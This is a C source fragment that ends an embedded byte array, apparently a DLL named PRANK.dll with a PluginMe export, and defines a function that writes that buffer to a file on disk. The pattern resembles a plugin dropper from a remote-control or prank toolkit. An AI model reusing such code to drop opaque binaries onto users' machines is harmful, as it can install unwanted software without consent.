    	0x94,0xF8,0x0A,0x5D,0x00,0x00,0x00,0x00,0x6E,0x71,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x64,0x71,0x00,0x00,0x68,0x71,0x00,0x00,
    	0x6C,0x71,0x00,0x00,0x90,0x13,0x00,0x00,0x78,0x71,0x00,0x00,0x00,0x00,0x50,0x52,0x41,0x4E,0x4B,0x2E,0x64,0x6C,0x6C,0x00,0x50,0x6C,0x75,0x67,0x69,0x6E,0x4D,0x65,
    	0x00,0x00,0x00,0x00,0x00,0x60,0x00,0x00,0x0C,0x00,0x00,0x00,0x7D,0x34,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
};


bool PRANKSaveFile(char *FileName)
{
	bool Result = false;
	HANDLE hFile; 
	DWORD  dwBytesWritten;
	hFile = CreateFile(FileName,GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,NULL,NULL);
	if (hFile == INVALID_HANDLE_VALUE) Result =false;
    if(WriteFile(hFile, PRANKMyFileBuf, PRANKMyFileSize, &dwBytesWritten, NULL)) Result =true;
	CloseHandle(hFile); 
	return Result;
}

#endif
